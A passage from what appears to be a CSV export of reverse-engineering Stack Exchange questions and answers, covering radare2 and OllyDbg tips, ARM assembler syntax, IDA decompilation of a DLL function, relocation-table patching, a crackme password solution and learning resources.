<p>(Which would be a useful program. I have seen ""plain"" code with such bad names that it already looked quite obfuscated. Some of it was my own. My younger self did not think my older self would ever need to understand his code.)</p>

<p>Even if obfuscating 'again' may change the names (again), it will not add an entire new ""level of obfuscation"".</p>
","8480"
"Any documentation available for r2 other than official book","654","","<p>I am interested in learning and using radare2 as a toolset for reverse engineering. But I want ANY other resource for learning this tools other than <strong>radare2 book</strong>, preferably a video series. What I am interested in is solving crackmes and executables debugging.</p>
","<p>I wrote <a href=""https://dustri.org/b/archives.html"">some articles</a> (search for <em>radare2</em>) about using r2 for crackmes, and there is a <a href=""http://www.rada.re/r/talks.html"">talk</a> section on the official website.</p>

<p>Also you can find useful articles from the <a href=""http://radare.today"">blog</a>.</p>

<p>Also, feel free to come ask questions on the irc channel.</p>
","10646"
"Ollydbg:how to let Olly remember a breakpoint for next run","654","","<p>I'm a Olly newbie... whenever I set a breakpoint at an address and found I need to restart the target program, the previously set breakpoints are all removed. Is there anyway to let Olly to remember the breakpoints for certain executable, so that everytime when I want to debug that executable, the previously set breakpoints are still there?</p>
","<p>This is a limitation of OllyDbg v1.</p>

<p>There are a couple of plugins designed to fix this in v1 (such as <a href=""http://www.openrce.org/downloads/details/168/Breakpoint_Manager"" rel=""nofollow"">Breakpoint Manager</a>), but the better solution is to upgrade to <a href=""http://www.ollydbg.de/odbg201.zip"" rel=""nofollow"">OllyDbg v2</a>.</p>
","12081"
"What is the current state of the art for platform modeling?","653","","<p>When we're doing reverse engineering, we have a few levels of models. One of them is the instruction semantics model, which tells us what every native instruction does to modify instruction state. We're making progress there. However, another problem is that of platform semantics, which is at a higher level. </p>

<p>For example, a high-level model of a userspace linux program would need to include information about mprotect and that it can alter the visibility of certain regions of code. Threading and callback semantics are also a platform modeling issue, we can discover a programs entrypoint from its header (which is another kind of semantic! but one we're probably not going to compromise on), but other entrypoints are published in the program in the form of arguments to atexit, pthread_create, etc. </p>

<p>What is our current best effort/state of the art at capturing this high level platform information in a way that is understood by practicioners? What about by mechanical / automated understanding systems? I know that IDA has (or has to have) information about different platform APIs, it seems to know that when an immediate is a parameter to pthread_create then that immediate is a pointer to code and should be treated as such. What do we have beyond that?</p>
","<h2>Direct Detection</h2>

<p>At the lowest level you can just have copies of the libraries and check if they are the one used. </p>

<h2>Signature based Detection</h2>

<p>At a higher level than that is <a href=""https://www.hex-rays.com/products/ida/tech/flirt/index.shtml"">IDA FLIRT</a> which stores just enough information about a library to identify its use. But its main benefit is reduced disk usage... it is worth noting that you can add more definitions to the default ones.</p>

<p>Hex-Rays talks about the technology <a href=""https://www.hex-rays.com/products/ida/tech/flirt/in_depth.shtml#implementation"">in-depth here</a>.</p>

<h2>Generic recognition</h2>

<p>Tools like Coverity or the <a href=""http://clang-analyzer.llvm.org/"">Clang static analyzer</a> or <a href=""http://klee.llvm.org/"">KLEE</a> are more general and more likely to include models for programming idioms.</p>

<p>The only thing I know of coming close to IDA that is open source is <a href=""https://github.com/radare/radare2"">radare</a> which might have some library recognition. Also <a href=""http://www.radare.org/""><code>radare</code>'s main page</a>. And I have been looking since I am hunting something like IDA that supports SPARC for free and it looks like <code>radare</code> does although I haven't had time it give it a go yet.</p>

<p>From what I can tell REC and Boomerang do not recognize libraries the way IDA does, but instead just attempt to decompile everything. <a href=""http://bap.ece.cmu.edu/"">BAP</a> does analysis of binaries and is derived from the Vine component of the BitBlaze project the two projects below are part of as well.</p>

<h2>Flow Analysis</h2>

<p>TEMU and Rudder <a href=""http://bitblaze.cs.berkeley.edu/#projects"">here</a> look to be quite advanced. And deal with code as it executes. TEMU helps to relate imputs and outputs to the flow. </p>

<p>It is also worth noting that the Bitblaze tools are designed to provide traces for use in IDA although they could probably be adapted for use otherwise.</p>

<p>Going off of the specifics you provided <a href=""http://bitblaze.cs.berkeley.edu/temu.html"">TEMU</a> sounds the closest to what you want.... it allows you to mark tainted inputs (memory locations, physical inputs etc...) and detect the effects of those taints on the execution. If you want to try out TEMU and are on a newer Linux distro (anything with GCC 4+ which is most anything in the past few years) follow the <a href=""https://groups.google.com/forum/?fromgroups#!topic/bitblaze-users/QdoY9l8D-ho"">instructions here</a>.</p>
","1721"
"How do i make gnu as recognize all ARMV7 instructions?","652","","<p>I disassembled an android library with IDA, and want to do some extra steps at the end of one of the functions. Currently, the last instruction bytes are <code>BD E8 F0 8F</code>, in thumb mode, which IDA disassembles to <code>POP.W {R4-R11,PC}</code>.</p>

<p>So i found a nice little piece of unused space, replaced the <code>POP.W</code> with a branch there, wrote my extension, remembered to put a <code>.thumb</code> and <code>.arch armv7a</code> at the start of my program, and finished my code with that <code>POP.W {R4-R11,PC}</code>. Unfortunately, using gnu as from an arm toolchain, this results in <code>Error: bad instruction pop.w '{R4-R11,PC}'</code> </p>

<p>Ok, gnu as doesn't like the .w suffix, so i replaced the instruction with <code>POP {R4-R11,PC}</code>. This changes the error message to Error: invalid register list to push/pop instruction -- <code>pop {R4-R11,PC}</code></p>

<p>I know that some older ARM chips had restrictions on what you could do with registers from R8 on, so, just for verification, i replaced the instruction with <code>POP {R4-R7,PC}</code>. And indeed, as assembles this well.</p>

<p>Now I don't know how to continue?</p>

<ul>
<li>Maybe I have to give another architecture option to as. But .arch armv7a seems to be the newest which is valid with android armv7a libraries.</li>
<li>Maybe i'm completely off track, and the pop instruction is actually a macro for two separate instructions, which pop high and low registers after another. But, the result of entering the individual two-byte instructions (<code>BD E8</code>, <code>F0 8F</code>) into the online disassembler seems to have nothing to do with popping from the stack.</li>
</ul>

<p>I also tried disabling macros in IDA's processor options, which didn't change anything. So i'm inclined to think the byte sequence is a genuine 4 byte thumb mode opcode.</p>

<p>What else do i need to specify in my program to make gnu as recognize the instruction?</p>
","<p>By default, <code>as</code>, uses the old 'divided' syntax for arm and thumb instructions. Hence it is not recognising your <code>pop.w</code> instruction.</p>

<p>To make it work, add <code>.syntax unified</code> at the start of your program.  This tells it to use the new unified syntax and you should find it assembles <code>pop.w</code> successfully.</p>

<p>See <a href=""https://sourceware.org/binutils/docs-2.24/as/ARM_002dInstruction_002dSet.html"">https://sourceware.org/binutils/docs-2.24/as/ARM_002dInstruction_002dSet.html</a> for more details.</p>
","8975"
"Win7 ASLR bypass","649","","<p>The conditions: say one patched programm has hardcoded address of <code>printf()</code> from dynamically loaded <code>msvcrt80.dll</code>. It works just fine on XP, but Win7 randomizes address space (ASLR), so this trick become impossible and program crashes with call of my hardcoded <code>printf()</code> address.</p>

<p>What should I do to retrieve IAT RVA of this <code>printf()</code> in win7 to make this work?</p>
","<p>If you can patch the program's image, you don't actually need to hardcode the address. you can simply add another import entry to the already existing import tables and have it patched in automatically by the loader.</p>

<p>See <a href=""http://www.programminghorizon.com/win32assembly/pe-tut6.html"" rel=""nofollow"" title=""Iczelion's import table tutorial"">Iczelion's tutorial</a> on import tables to guide you further.</p>

<p>Of course, if you're trying to do that from shellcode, you'll need to walk the loader data, locating the DLL image. The <code>Ldr</code> member in <a href=""http://en.wikipedia.org/wiki/Process_Environment_Block%20%22PEB%20structure"" rel=""nofollow"">PEB</a> should help you with that.</p>

<p>If you'd be so kind to provide more details on what exactly you are trying to do, I'll update the answer; there is no simple answer to the ""how to defeat ASLR"" question.</p>
","4706"
"Finding password in disassembled code","647","","<p>I'm trying to learn reverse engineering techniques, apologies in advance if I leave anything out</p>

<p>I'm trying to find the password in the following section of disassembled code (there are other blocks of code in case those need to be included as well)</p>

<pre><code>push    ebp
mov     ebp, esp
and     esp, 0FFFFFFF0h
push    esi
push    ebx
sub     esp, 158h
mov     eax, [ebp+arg_4]
mov     [esp+1Ch], eax
mov     eax, large gs:14h
mov     [esp+14Ch], eax
xor     eax, eax
mov     dword ptr [esp+2Eh], 74726170h
mov     word ptr [esp+32h], 32h
mov     dword ptr [esp+141h], 32656854h
mov     dword ptr [esp+145h], 6150646Eh
mov     word ptr [esp+149h], 7472h
mov     byte ptr [esp+14Bh], 0
mov     dword ptr [esp+4], offset aPassword ; ""password:\n""
mov     dword ptr [esp], offset _ZSt4cout ; std::cout
call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt; &amp;,char const*)
mov     dword ptr [esp+8], 100h ; int
lea     eax, [esp+41h]
mov     [esp+4], eax    ; char *
mov     dword ptr [esp], offset _ZSt3cin ; this
call    __ZNSi3getEPci  ; std::istream::get(char *,int)
lea     eax, [esp+40h]
mov     [esp], eax
call    __ZNSaIcEC1Ev   ; std::allocator&lt;char&gt;::allocator(void)
lea     eax, [esp+40h]
mov     [esp+8], eax
mov     dword ptr [esp+4], offset aThisisnotthepa ; ""thisisnotthepassword""
lea     eax, [esp+38h]
mov     [esp], eax
call    __ZNSsC1EPKcRKSaIcE ; std::string::string(char const*,std::allocator&lt;char&gt; const&amp;)
lea     eax, [esp+40h]
mov     [esp], eax
call    __ZNSaIcED1Ev   ; std::allocator&lt;char&gt;::~allocator()
mov     dword ptr [esp+8], 3E8h ; n
lea     eax, [esp+41h]
mov     [esp+4], eax    ; s2
mov     dword ptr [esp], offset s1 ; ""FBQ2GE9""
call    _strncmp
test    eax, eax
jnz     short loc_8048A74
</code></pre>

<p>If the compare succeeds, then the password is correct</p>

<p>I was thinking that it would have been <code>FBQ2GE9</code>, but that's apparently the wrong answer. What am I missing here?</p>
","<p>I'm not specialist, especially in C++ re, but password is constructing in the lines:</p>

<pre><code>mov     dword ptr [esp+2Eh], 74726170h
...
mov     byte ptr [esp+14Bh], 0
</code></pre>

<p>Second command is <code>null</code>-byte in null terminated strings. 
Also, you should take care to <a href=""https://en.wikipedia.org/wiki/Endianness"" rel=""nofollow"">endianness</a>.
So answer is in that numbers: <code>70617274 32 54686532 6E645061 7274</code>.
This is hex representation of password, which you can convert into ascii with python3 command:</p>

<pre><code>$ python3 -c 'import binascii; print(binascii.unhexlify(""7061727432546865326E6450617274""))'
b'part2The2ndPart'
</code></pre>

<p>So the answer is <code>part2The2ndPart</code></p>

<p>Also take a look at the <a href=""http://beginners.re"" rel=""nofollow"">Denis's Yrichev reverse engineering book for beginners.</a></p>

<p><em>UPDATE</em></p>

<pre><code>./part1.exe
password:
FBQ2GE9
correct!
username: part2, password: The2ndPart
10.56.15.125
</code></pre>
","13148"
"Problem with IDA Pro Code","647","","<p>I have decompiled a DLL and IDA Pro came up with the following code:</p>

<pre><code>signed int __thiscall sub_10029900(void *a1, int a2) 
{    
int v2; // esi@1
int v3; // ebx@1
int v4; // eax@1
int v5; // edx@3
int v6; // eax@5
signed int v7; // esi@5
bool v8; // cf@7
signed int v9; // eax@8
int v11; // [sp+10h] [bp-20h]@1

v2 = 0;
v3 = EnumFirstValidChild(a1, &amp;v11);

..........

return v2;
}
</code></pre>

<p>Where <code>EnumFirstValidChild</code> is defined as:</p>

<pre><code>int __userpurge EnumFirstValidChild&amp;lt;eax&gt;(int a1&amp;lt;eax&gt;, int a2, int a3);
</code></pre>

<p>I modified the code above to call the userpurge function as follows:</p>

<pre><code>int *v12 = &amp;v11;

__asm 
{ 
  push v12
  push a1
  call sub_10029800
  mov v3, eax
}
</code></pre>

<p>The problem I am having is that the call to this function is causing a stack a Run-Time Check Failure #2 - Stack around <code>v11</code> variable.</p>

<p><code>v11</code> is 4 bytes long and I see that more than 16 bytes are wtitten to that pointer.</p>

<p>What could it be wrong? </p>

<p>Thanks!</p>

<p><strong>EDIT:</strong> </p>

<p>Disassembled code listing of <code>sub_10029900</code></p>

<pre><code>.text:10029900 ; =============== S U B R O U T I N E ===========
.text:10029900
.text:10029900 ; Attributes: bp-based frame
.text:10029900
.text:10029900 sub_10029900    proc near               ; CODE XREF: sub_1000F400+F1p
.text:10029900                                         ; sub_10010870+135p ...
.text:10029900
.text:10029900 var_20          = dword ptr -20h
.text:10029900 arg_0           = dword ptr  8
.text:10029900
.text:10029900                 mov     edi, edi
.text:10029902                 push    ebp
.text:10029903                 mov     ebp, esp
.text:10029905                 and     esp, 0FFFFFFF8h
.text:10029908                 sub     esp, 24h
.text:1002990B                 lea     eax, [esp+24h+var_20]
.text:1002990F                 push    ebx
.text:10029910                 push    esi
.text:10029911                 push    edi
.text:10029912                 push    eax
.text:10029913                 push    ecx
.text:10029914                 xor     esi, esi
.text:10029916                 call    ds:EnumFirstValidChild
.text:1002991C                 mov     ebx, eax
.text:1002991E                 lea     eax, [esi+1]
.text:10029921                 test    ebx, ebx
.text:10029923                 jz      short loc_10029985
.text:10029925                 mov     edi, [ebp+arg_0]
.text:10029928
.text:10029928 loc_10029928:                           ; CODE XREF: sub_10029900+6Aj
.text:10029928                 test    eax, eax
.text:1002992A                 jz      short loc_10029983
.text:1002992C                 mov     edx, [esp+30h+var_20]
.text:10029930                 test    edx, edx
.text:10029932                 jz      short loc_1002995E
.text:10029934                 test    edi, edi
.text:10029936                 jz      short loc_1002995E
.text:10029938                 mov     eax, edi
.text:1002993A                 mov     esi, 0Ch
.text:1002993F                 nop
.text:10029940
.text:10029940 loc_10029940:                           ; CODE XREF: sub_10029900+4Fj
.text:10029940                 mov     ecx, [edx]
.text:10029942                 cmp     ecx, [eax]
.text:10029944                 jnz     short loc_10029958
.text:10029946                 add     edx, 4
.text:10029949                 add     eax, 4
.text:1002994C                 sub     esi, 4
.text:1002994F                 jnb     short loc_10029940
.text:10029951                 mov     eax, 1
.text:10029956                 jmp     short loc_1002995A
.text:10029958 ; ---------------------------------------------------------------------------
.text:10029958
.text:10029958 loc_10029958:                           ; CODE XREF: sub_10029900+44j
.text:10029958                 xor     eax, eax
.text:1002995A
.text:1002995A loc_1002995A:                           ; CODE XREF: sub_10029900+56j
.text:1002995A                 test    eax, eax
.text:1002995C                 jnz     short loc_1002996C
.text:1002995E
.text:1002995E loc_1002995E:                           ; CODE XREF: sub_10029900+32j
.text:1002995E                                         ; sub_10029900+36j
.text:1002995E                 lea     eax, [esp+30h+var_20]
.text:10029962                 push    eax
.text:10029963                 push    ebx
.text:10029964                 call    ds:EnumNextValidChild
.text:1002996A                 jmp     short loc_10029928
.text:1002996C ; ---------------------------------------------------------------------------
.text:1002996C
.text:1002996C loc_1002996C:                           ; CODE XREF: sub_10029900+5Cj
.text:1002996C                 push    ebx
.text:1002996D                 mov     esi, 1
.text:10029972                 call    ds:EndEnumValidChild
.text:10029978                 mov     eax, esi
.text:1002997A                 pop     edi
.text:1002997B                 pop     esi
.text:1002997C                 pop     ebx
.text:1002997D                 mov     esp, ebp
.text:1002997F                 pop     ebp
.text:10029980                 retn    4
.text:10029983 ; ---------------------------------------------------------------------------
</code></pre>

<p>Disassembled code listing of <code>EnumFirstValidChild</code>.</p>

<pre><code>.text:1000B710 ; Exported entry   4. EnumFirstValidChild
.text:1000B710
.text:1000B710 ; =============== S U B R O U T I N E ==============
.text:1000B710
.text:1000B710 ; Attributes: bp-based frame
.text:1000B710
.text:1000B710                 public EnumFirstValidChild
.text:1000B710 EnumFirstValidChild proc near ; DATA XREF: .text:off_10027368o
.text:1000B710
.text:1000B710 var_28          = dword ptr -28h
.text:1000B710 var_24          = dword ptr -24h
.text:1000B710 var_20          = dword ptr -20h
.text:1000B710 var_1C          = dword ptr -1Ch
.text:1000B710 var_18          = byte ptr -18h
.text:1000B710 var_C           = dword ptr -0Ch
.text:1000B710 var_4           = dword ptr -4
.text:1000B710 arg_0           = dword ptr  8
.text:1000B710 arg_4           = dword ptr  0Ch
.text:1000B710
.text:1000B710                 mov     edi, edi
.text:1000B712                 push    ebp
.text:1000B713                 mov     ebp, esp
.text:1000B715                 and     esp, 0FFFFFFF8h
.text:1000B718                 mov     eax, large fs:0
.text:1000B71E                 push    0FFFFFFFFh
.text:1000B720                 push    offset SEH_1001DAD0
.text:1000B725                 push    eax
.text:1000B726                 mov     large fs:0, esp
.text:1000B72D                 sub     esp, 20h
.text:1000B730                 mov     ecx, dword_1002ACE8
.text:1000B736                 push    ebx
.text:1000B737                 push    esi
.text:1000B738                 push    edi
.text:1000B739                 xor     edi, edi
.text:1000B73B                 test    ecx, ecx
.text:1000B73D                 jnz     short loc_1000B77D
.text:1000B73F                 push    dword_1002ACE4
.text:1000B745                 lea     eax, [esp+3Ch+var_28]
.text:1000B749                 push    eax
.text:1000B74A                 push    7Ch
.text:1000B74C                 push    1
.text:1000B74E                 call    ds:api_func_107
.text:1000B754                 mov     ecx, [esp+38h+var_28]
.text:1000B758                 mov     [esp+38h+var_24], ecx
.text:1000B75C                 mov     [esp+38h+var_4], edi
.text:1000B760                 test    ecx, ecx
.text:1000B762                 jz      short loc_1000B76D
.text:1000B764                 call    sub_10005440
.text:1000B769                 mov     ecx, eax
.text:1000B76B                 jmp     short loc_1000B76F
.text:1000B76D ; ---------------------------------------------------------------------------
.text:1000B76D
.text:1000B76D loc_1000B76D:                           ; CODE XREF: EnumFirstValidChild+52j
.text:1000B76D                 xor     ecx, ecx
.text:1000B76F
.text:1000B76F loc_1000B76F:                           ; CODE XREF: EnumFirstValidChild+5Bj
.text:1000B76F                 mov     [esp+38h+var_4], 0FFFFFFFFh
.text:1000B777                 mov     dword_1002ACE8, ecx
.text:1000B77D
.text:1000B77D loc_1000B77D:                           ; CODE XREF: EnumFirstValidChild+2Dj
.text:1000B77D                 mov     eax, [ebp+arg_0]
.text:1000B780                 lea     esi, [ecx+34h]
.text:1000B783                 mov     [esp+38h+var_24], eax
.text:1000B787                 mov     ecx, esi
.text:1000B789                 lea     eax, [esp+38h+var_24]
.text:1000B78D                 push    eax
.text:1000B78E                 lea     eax, [esp+3Ch+var_18]
.text:1000B792                 push    eax
.text:1000B793                 call    sub_10008330
.text:1000B798                 mov     ecx, [eax]
.text:1000B79A                 mov     ebx, [eax+4]
.text:1000B79D                 mov     eax, [esi+4]
.text:1000B7A0                 mov     [esp+38h+var_20], ecx
.text:1000B7A4                 mov     [esp+38h+var_1C], ebx
.text:1000B7A8                 mov     [esp+38h+var_24], eax
.text:1000B7AC                 test    ecx, ecx
.text:1000B7AE                 jz      short loc_1000B7B4
.text:1000B7B0                 cmp     ecx, esi
.text:1000B7B2                 jz      short loc_1000B7BE
.text:1000B7B4
.text:1000B7B4 loc_1000B7B4:                           ; CODE XREF: EnumFirstValidChild+9Ej
.text:1000B7B4                 call    ds:_invalid_parameter_noinfo
.text:1000B7BA                 mov     eax, [esp+38h+var_24]
.text:1000B7BE
.text:1000B7BE loc_1000B7BE:                           ; CODE XREF: EnumFirstValidChild+A2j
.text:1000B7BE                 mov     esi, [ebp+arg_4]
.text:1000B7C1                 cmp     ebx, eax
.text:1000B7C3                 jz      short loc_1000B80B
.text:1000B7C5                 lea     ecx, [esp+38h+var_20]
.text:1000B7C9                 call    sub_10008390
.text:1000B7CE                 mov     ebx, [eax+4]
.text:1000B7D1                 test    ebx, ebx
.text:1000B7D3                 jz      short loc_1000B80B
.text:1000B7D5                 push    esi
.text:1000B7D6                 push    0
.text:1000B7D8                 mov     ecx, ebx
.text:1000B7DA                 call    sub_1001D620
.text:1000B7DF                 test    eax, eax
.text:1000B7E1                 jz      short loc_1000B80B
.text:1000B7E3                 push    dword_1002ACE4
.text:1000B7E9                 lea     eax, [esp+3Ch+var_24]
.text:1000B7ED                 push    eax
.text:1000B7EE                 push    8
.text:1000B7F0                 push    1
.text:1000B7F2                 call    ds:api_func_107
.text:1000B7F8                 mov     edi, [esp+38h+var_24]
.text:1000B7FC                 test    edi, edi
.text:1000B7FE                 jz      short loc_1000B80B
.text:1000B800                 mov     [edi], ebx
.text:1000B802                 mov     dword ptr [edi+4], 0
.text:1000B809                 jmp     short loc_1000B824
.text:1000B80B ; ---------------------------------------------------------------------------
.text:1000B80B
.text:1000B80B loc_1000B80B:                           ; CODE XREF: EnumFirstValidChild+B3j
.text:1000B80B                                         ; EnumFirstValidChild+C3j ...
.text:1000B80B                 xor     eax, eax
.text:1000B80D                 mov     [esi], eax
.text:1000B80F                 mov     [esi+4], eax
.text:1000B812                 mov     [esi+8], eax
.text:1000B815                 mov     [esi+0Ch], eax
.text:1000B818                 mov     [esi+10h], eax
.text:1000B81B                 mov     [esi+14h], eax
.text:1000B81E                 mov     [esi+18h], eax
.text:1000B821                 mov     [esi+1Ch], eax
.text:1000B824
.text:1000B824 loc_1000B824:                           ; CODE XREF: EnumFirstValidChild+F9j
.text:1000B824                 mov     ecx, [esp+38h+var_C]
.text:1000B828                 mov     eax, edi
.text:1000B82A                 pop     edi
.text:1000B82B                 pop     esi
.text:1000B82C                 mov     large fs:0, ecx
.text:1000B833                 pop     ebx
.text:1000B834                 mov     esp, ebp
.text:1000B836                 pop     ebp
.text:1000B837                 retn    8
.text:1000B837 EnumFirstValidChild endp
.text:1000B837
.text:1000B837 ; ---------------------------------------------------------------------------
</code></pre>

<p>Decompiled code of <code>sub_10029900</code>.</p>

<pre><code>signed int __thiscall sub_10029900(void *this, int a2) //note that I changed *this to *a1
{
  int v2; // esi@1
  int v3; // ebx@1
  int v4; // eax@1
  int v5; // edx@3
  int v6; // eax@5
  signed int v7; // esi@5
  bool v8; // cf@7
  signed int v9; // eax@8
  int v11; // [sp+10h] [bp-20h]@1

  v2 = 0;
  v3 = EnumFirstValidChild(this, &amp;v11);
  v4 = 1;
  if ( v3 )
  {
    while ( v4 )
    {
     v5 = v11;
      if ( v11 &amp;&amp; a2 )
      {
        v6 = a2;
        v7 = 12;
        while ( *(_DWORD *)v5 == *(_DWORD *)v6 )
        {
          v5 += 4;
          v6 += 4;
          v8 = (unsigned int)v7 &lt; 4;
          v7 -= 4;
          if ( v8 )
          {
            v9 = 1;
            goto LABEL_10;
          }
        }
        v9 = 0;
LABEL_10:
        if ( v9 )
        {
          EndEnumValidChild(v3);
          return 1;
       }
      }
      v4 = EnumNextValidChild(v3, &amp;v11);
    }
    v2 = 0;
  }
  EndEnumValidChild(v3);
  return v2;
}
</code></pre>

<p>Decompiled code of <code>EnumFirstValidChild</code>.</p>

<pre><code>int __userpurge EnumFirstValidChild&lt;eax&gt;(int a1&lt;eax&gt;, int a2, int a3)
{
  int v3; // ecx@1
  int v4; // edi@1
  int v5; // esi@6
  int v6; // eax@6
  int v7; // ecx@6
  int v8; // ebx@6
  int v9; // eax@6
  int v10; // ebx@10
  int v12; // [sp+1Ch] [bp-28h]@2
  int v13; // [sp+20h] [bp-24h]@2
  int v14; // [sp+24h] [bp-20h]@6
  int v15; // [sp+28h] [bp-1Ch]@6
  char v16; // [sp+2Ch] [bp-18h]@6
  int v17; // [sp+38h] [bp-Ch]@1
  int (__cdecl *v18)(); // [sp+3Ch] [bp-8h]@1
  int v19; // [sp+40h] [bp-4h]@1

  v19 = -1;
  v18 = SEH_1001DAD0;
  v17 = a1;
  v3 = dword_1002ACE8;
  v4 = 0;
  if ( !dword_1002ACE8 )
  {
    api_func_107(1, 124, &amp;v12, dword_1002ACE4);
    v13 = v12;
    v19 = 0;
    if ( v12 )
      v3 = sub_10005440(v12);
    else
      v3 = 0;
    v19 = -1;
    dword_1002ACE8 = v3;
  }
  v5 = v3 + 52;
  v13 = a2;
  v6 = sub_10008330(v3 + 52, (int)&amp;v16, (int)&amp;v13);
  v7 = *(_DWORD *)v6;
  v8 = *(_DWORD *)(v6 + 4);
  v9 = *(_DWORD *)(v5 + 4);
  v14 = v7;
  v15 = v8;
  v13 = v9;
  if ( !v7 || v7 != v5 )
  {
    invalid_parameter_noinfo(v7);
    v9 = v13;
  }
  if ( v8 != v9
    &amp;&amp; (v10 = *(_DWORD *)(sub_10008390(&amp;v14) + 4)) != 0
    &amp;&amp; sub_1001D620(v10, 0, a3)
    &amp;&amp; (api_func_107(1, 8, &amp;v13, dword_1002ACE4), (v4 = v13) != 0) )
  {
    *(_DWORD *)v13 = v10;
    *(_DWORD *)(v4 + 4) = 0;
  }
  else
  {
    *(_DWORD *)a3 = 0;
    *(_DWORD *)(a3 + 4) = 0;
    *(_DWORD *)(a3 + 8) = 0;
    *(_DWORD *)(a3 + 12) = 0;
    *(_DWORD *)(a3 + 16) = 0;
    *(_DWORD *)(a3 + 20) = 0;
    *(_DWORD *)(a3 + 24) = 0;
    *(_DWORD *)(a3 + 28) = 0;
  }
  return v4;
}
</code></pre>
","<p>Let's start from the begginning :</p>

<pre><code>int __userpurge EnumFirstValidChild&lt;eax&gt;(int a1&lt;eax&gt;, int a2, int a3);
</code></pre>

<p>Your <code>EnumFirstValidChild</code> prototype takes <code>eax</code> as the first argument, but if you look at <code>eax</code> in this function, it gets immediately erased by <code>Teb-&gt;NtTib-&gt;ExceptionList</code> (aka <code>fs:[0]</code>) at <code>.text:1000B718</code>.</p>

<p>Thus, the first argument isn't valid, let's fix that as a first step :</p>

<pre><code>int __cdecl EnumFirstValidChild (int a1, int a2);
</code></pre>

<p>I think you have already found that out, but better make sure everything is clear.</p>

<p>Now, more precisely about your question :</p>

<blockquote>
  <p>v11 is 4 bytes long and I see that more than 16 bytes are written to that pointer.
  What could it be wrong? </p>
</blockquote>

<p>As you may know, Hexrays doesn't produce compilable C code, but pseudo C-like code. 
You have to give hints to the decompiler if you want it to decompile a correct C code.</p>

<p>About your issue, you were right, v11 is not 4 bytes long, but actually at least 32 bytes long : at the end of the function <code>EnumFirstValidChild</code>, it writes 32 bytes at the adress of the second argument :</p>

<pre><code>*(_DWORD *)a3 = 0;
*(_DWORD *)(a3 + 4) = 0;
*(_DWORD *)(a3 + 8) = 0;
*(_DWORD *)(a3 + 12) = 0;
*(_DWORD *)(a3 + 16) = 0;
*(_DWORD )(a3 + 20) = 0;
*(_DWORD *)(a3 + 24) = 0;
*(_DWORD *)(a3 + 28) = 0; 
</code></pre>

<p>Furthermore, the decompiler gives you a quick way to notice this :
In <code>sub_10029900</code>, there's nothing on the stack except :</p>

<pre><code>int v11; // [bp-20h]
</code></pre>

<p>As you can see, there's some space between bp and bp-20h. There is just enough space for your 32 bytes array, so we can conclude that your structure size is indeed 32 bytes long.</p>

<p>If you wish, you can fix the output of Hexray following this procedure :</p>

<p><img src=""https://i.cubeupload.com/tnhs90.gif"" alt=""enter image description here""></p>
","9180"
"Relocation table patching","647","","<p>Now working on binary analysis of PE and stuck on tricky (for me), ungoogleable question.</p>

<p>For instance, I've binary, that needs to be patched. So after doing that will be awesome, if there is way to insert address of my function to relocation table. The following picture can illustrate thing I'm talking about.</p>

<p><img src=""https://i.stack.imgur.com/bk5RQ.png"" alt=""Relocated functions in binary""></p>

<p>So, as you can see, relocated functions marked pale, and my function is not in the relocation table. What should I patch to add my function into relocation table? Tried CFF Explorer with no luck. All the patches was made in hiew.</p>
","<p>Issue solved. For that moment tested several utilities for relocation patching. </p>

<p><a href=""http://www.woodmann.com/collaborative/tools/index.php/RelocEditor"" rel=""nofollow"">RelocEditor</a> - didn't solve the issue, but maybe for some future researchers who will face with similar task will find it useful </p>

<p><a href=""https://yadi.sk/d/58FFCzwdVkTuo"" rel=""nofollow"">Reloc Rebuilder</a> - actually solved issue. Just select patched executable and app should fix the relocation table.</p>

<p><a href=""https://github.com/gta126/Relocation-Section-Editor"" rel=""nofollow"">Relocation Section Editor</a> - didn't tried myself, but should also work. Link here because of purposes as in first item.</p>
","4759"
"Good foundation for reverse engineering malware","646","","<p>I have been intrigued by reverse engineering recently and just finished Paul Carter's <em>PC Assembly Language</em> book (<a href=""http://pacman128.github.io/static/pcasm-book.pdf"" rel=""nofollow"">http://pacman128.github.io/static/pcasm-book.pdf</a>) which was a great primer for x86. My first question is: What is a good intermediate level book to get a better grasp of x86 assembly? Secondly: Should I get a better grasp of the C programming language before I dive deeper into x86? At the moment I only have basic knowledge of C as well.</p>

<p>Sorry if this is an opinion type question but I highly respect the input of people on this forum regarding this topic.</p>
","<p>Knowing how things in C work under the hood will help you if you're familiar with C and use it as your primary programming language, otherwise it's perfectly fine to have x86 asm as your first programing language.</p>

<p>If you want a better understanding of the relationship between C and x86 assembly, I recommend reading the 7th chapter of <a href=""http://rads.stackoverflow.com/amzn/click/1931769222"" rel=""nofollow noreferrer"">Hacker disassembling uncovered</a> (there's a free chm version online).</p>

<p>As a reverse engineer you'll need to understand and be fluent with machine code. Knowing C might help because it's relatively low level and forces you to understand machine level concepts such as the stack, pointers, etc. Good grasp of assembly is far more important.</p>

<p>The best way is probably to go to <a href=""http://crackmes.de/"" rel=""nofollow noreferrer"">crackmes.de</a> and other similar sites and starting solving challenges. some challenges there are very novice and some are extremely difficult to solve. Focus on the type of RE that interests you (malware, keygen/cracking, crypto, trainers/mods, complex programs) and once you gained enough experience get something real to work on, even just to take it up as a challenge.</p>

<p><strong>EDIT</strong>: <a href=""http://crackmes.de/"" rel=""nofollow noreferrer"">crackmes.de</a> was taken down some time ago, another decent resource is <a href=""https://tuts4you.com/download.php"" rel=""nofollow noreferrer"">tuts4you.com's download section</a>.</p>
","13832"
"Read a struct from memory","646","","<p>I'm trying to load a struct defined in a program that i'm reading the memory of, so I can use it to define objects in my python debugger (in windows).</p>

<p>What format do structs take in memory, and what information can i get from finding the struct.
Is it possible to find the offsets for all attributes, and all objects linking to the struct?</p>

<p>I'd prefer to be able to do this without using breakpoints, but I can use them if there is no other way.</p>
","<p>You should rather ask your questions with some kind of example output so that answers are not based on guesswork. </p>

<p>Does <em>iam loading the struct</em> mean </p>

<ul>
<li>I wrote a program where I am employing OpenProcess() ReadProcessMemory() </li>
</ul>

<p>or does it mean</p>

<ul>
<li>i am opening the raw file with FILE * fp ; fopen(""c:\XXX"",""wb"") fread(fp); or load it in say ollydbg or in a hexeditor</li>
</ul>

<p>Assuming you use <code>ReadProcessMemory</code> 
the buffer you provided will be filled with bytes. It is up to you to cast it to proper type for accessing various members of the struct 
(yes you need a valid prototype of the structure beforehand).</p>

<p>A pseudo form could be like this</p>

<pre><code>type result;
